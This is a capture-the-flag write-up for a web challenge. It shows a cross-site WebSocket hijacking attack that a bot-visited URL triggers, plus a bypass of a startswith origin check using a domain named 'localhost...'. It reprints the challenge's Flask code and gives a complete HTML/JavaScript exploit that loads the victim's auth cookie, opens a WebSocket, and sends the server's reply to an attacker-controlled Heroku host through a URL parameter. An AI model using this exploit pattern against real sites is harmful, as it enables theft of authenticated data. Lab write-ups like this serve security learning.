We are given access to the challenge server (http://challs.nusgreyhats.org:12326/) that leads us to a pretty innocous page spitting a bunch of quotes. Looking at the commented HTML code (or just snooping through the provided server code) we are lead to the /share endpoint, which allows us to upload a website URL which will then be visited by the bot. We are also given access to the source files, which thankfully makes our lives a whole lot easier.

```
class Bot(Thread):
    def __init__(self, url):
        Thread.__init__(self)
        self.url = url

    def run(self):
        driver = webdriver.Firefox(service=Service(DRIVER_PATH), options=options)
        driver.get(self.url)
        time.sleep(3)
        driver.quit()
        
@app.route('/share', methods=['GET','POST'])
def share():
    if request.method == "GET":
        return render_template("share.html")
    else:
        if not request.form.get('url'):
            return "yes?"
        else:
            thread_a = Bot(request.form.get('url'))
            thread_a.start()
            return "nice quote, thanks for sharing!"
 ```
 
 Inspecting the code, upon uploading a URL to /share, the server will spawn a selenium instance to open the url for 3 seconds. What can we do with these 3 seconds? Looking at the rest of the source code, we find our main target.
 
 ```
 @app.route('/auth')
def auth():
    print('/auth', flush=True)
    print(request.remote_addr, flush=True)
    if request.remote_addr == "127.0.0.1":
        resp = make_response("authenticated")
        # I heard httponly defend against XSS(what is that?)
        resp.set_cookie("auth", auth_token, httponly=True)
    else:
        resp = make_response("unauthenticated")
    return resp


@sockets.route('/quote')
def echo_socket(ws):
    print('/quote', flush=True)
    while not ws.closed:
        try:
            try:
                cookie = dict(i.split('=') for i in ws.handler.headers.get('Cookie').split('; '))
            except:
                cookie = {}

            # only admin from localhost can get the GreyCat's quote
            if ws.origin.startswith("http://localhost") and cookie.get('auth') == auth_token:
                ws.send(f"{os.environ['flag']}")
            else:
                ws.send(f"{quotes[random.randint(0,len(quotes))]}")
            ws.close()
        except Exception as e:
            print('error:',e, flush=True)
 ```
 
 In summary, the index page establishes a websocket connection to the server through the route `/quote`. The server usually sends over random quotes over the websocket, but will instead send the flag upon two very specific conditions: 
 1. The websocket request must include the correct auth tokens (which can be obtained by visiting the route `/auth` with `request.remote_addr == "127.0.0.1":`)
 2. The origin of the request must begin with `http://localhost`
 
 This makes our objective very clear: craft a malicious payload hosted on our own server, which when visited by the selenium instance will allow us to exfiltrate the flag. However, this is easier said than done.
 
 We tried experimenting with many things. Most of our attempts began with using `window.open` to open a tab to `localhost:7070/auth`, which loaded the auth cookies. Some ideas included trying to somehow print and exfiltrate the auth cookie using XSS magic (thwarted by CORS and httponly cookies!), or going back to index and trying to print the contents of the page (more CORS filters and stuff). I did also briefly entertain the idea of XSS leaks having experimented with it before (check out the Securebank challenge for HIC 2021 :)) but couldn't find any clear exploit. 
 
 Thus, our next step was to investigate websockets for any potential vulnerability. Reading on, we found out that WebSockets did not natively implement any form of Same Origin Policy (https://dev.solita.fi/2018/11/07/securing-websocket-endpoints.html) meaning that we could make websocket requests from anywhere and access the results without having to deal with CORS issues! There were also known exploit vectors such as Cross-site WebSocket hijacking (https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking), whereby a malicious website can use existing cookies on a victim's browser to establish a websocket connection with authentication. We will be leveraging this in our exploit.
 
 Below details the key idea of our exploit.
 
 1. When the bot visits the malicious website, the website opens a new tab to `localhost:7070/auth`, which then loads the auth cookies to the browser
 2. The website then redirects the tab back to our malicious website, allowing us to inject code into the tab
 3. The injected code will spawn a websocket connection to `localhost:7070/quote`, and finally return the response (which is hopefully the flag!) through a url parameter.

However, while this gets us ever so close to the flag, we are still one step short. There has been some sort of safeguard implemented against the attack in the form of origin validation, and we need to find a way to bypass this `http://localhost` check. We again experimented with spawning the websocket connection before redirecting to our own website (and again, CORS issues), but ultimately found a simple workaround. The server does a `startswith` check to determine if the address is localhost, meaning that if our malicious domain also began with localhost, it would bypass this check! While tweaking around with host files can work, we just relabelled our heroku domain to start with localhost, and the exploit finally worked!

```
<h3>You won $100,000</h3>

<script>

    function hack() {
        
        var queryString = new URLSearchParams(window.location.search);
        var trying = parseInt(queryString.get('try'));
        //var home = "http://localhost:5000"
        var url = "http://localhost:7070"
        var home = "http://localhostsafenotsafe.herokuapp.com"
        if (trying != 1) return;
        winDW = window.open(url + "/auth", "csrf-frame")
        console.log("window opened")
        setTimeout(function() {
            winDW.location = home;
            scr = document.createElement('script')
            scr.text = "ws = new WebSocket('ws://localhost:7070/quote'); ws.onopen = function start(event) { ws.send('HELLO'); }; ws.onmessage = function handleReply(event) { str = '" + home + "'; str += '?ans='; str += encodeURIComponent(event.data); window.location = str; };"
            setTimeout(function() {
                winDW.document.head.appendChild(scr);
            }, 350);
        }, 350);
    }
    window.onload = function() {
        hack();
    }
</script>
```

(Sidenote: In hindsight, this exploit could be made *much* simpler as cookies are stored in the browser, not tab context. Also for some reason our final exploit didn't work locally but worked on the server, maybe due to some non-default sameSite cookie configurations on selenium?)

url inserted into /share: `http://localhostsafenotsafe.herokuapp.com/?try=1`

![image](https://user-images.githubusercontent.com/7780255/173227391-b6e381e1-788b-4b83-9fa5-adbcba72993c.png)
